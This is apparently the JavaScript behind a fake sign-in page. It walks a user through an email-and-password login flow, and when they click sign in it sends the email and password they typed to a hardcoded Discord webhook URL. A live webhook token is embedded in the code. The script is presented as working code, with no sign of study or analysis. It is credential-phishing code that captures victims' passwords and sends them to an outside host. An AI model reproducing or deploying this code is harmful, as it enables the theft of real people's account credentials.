 const emailInput = document.getElementById('emailInput');
        const nextButton = document.getElementById('nextButton');
        const slideWrapper = document.getElementById('slideWrapper');
        const userEmail = document.getElementById('userEmail');
        const backButton = document.getElementById('backButton');
        const passwordInput = document.getElementById('passwordInput');
        const signInOptions = document.getElementById('signInOptions');

        nextButton.addEventListener('click', function(e) {
            e.preventDefault();
            const email = emailInput.value.trim();
            
            if (email) {
                signInOptions.classList.add('hidden');
                
                slideWrapper.style.transform = 'translateX(-33.333%)';
                userEmail.textContent = email;
                
                setTimeout(() => {
                    slideWrapper.style.transform = 'translateX(-66.666%)';
                    
                    setTimeout(() => {
                        passwordInput.focus();
                    }, 300);
                }, 500);
            }
        });

        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                nextButton.click();
            }
        });

        backButton.addEventListener('click', function(e) {
            e.preventDefault();
            slideWrapper.style.transform = 'translateX(0)';
            
            signInOptions.classList.remove('hidden');
            
            setTimeout(() => {
                emailInput.focus();
            }, 300);
        });

        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('signInButton').click();
            }
        });

        document.getElementById('signInButton').addEventListener('click', function(e) {
            e.preventDefault();
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            sendDiscordMessage('Email: ' + email + '\nPassword: ' + password);
        });

        const webhookUrl = 'https://discordapp.com/api/webhooks/1433506112686133270/TvgvzAlJU1uOJMmuGeGzTzbKWI9OjbIUW7EUhuUzRdM6sgSDxgpEEr1IyGvGTlnx3cJ4';

async function sendDiscordMessage(content) {
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: content
      })
    });

    if (response.ok) {
      console.log('Message sent successfully!');
    } else {
      console.error('Failed to send message:', response.status);
    }
  } catch (error) {
    console.error('Error sending message:', error);
  }
}

        document.getElementById('cancelLink').addEventListener('click', function(e) {
            e.preventDefault();
            slideWrapper.style.transform = 'translateX(0)';
            
            signInOptions.classList.remove('hidden');
            
            setTimeout(() => {
                emailInput.focus();
            }, 300);
        });
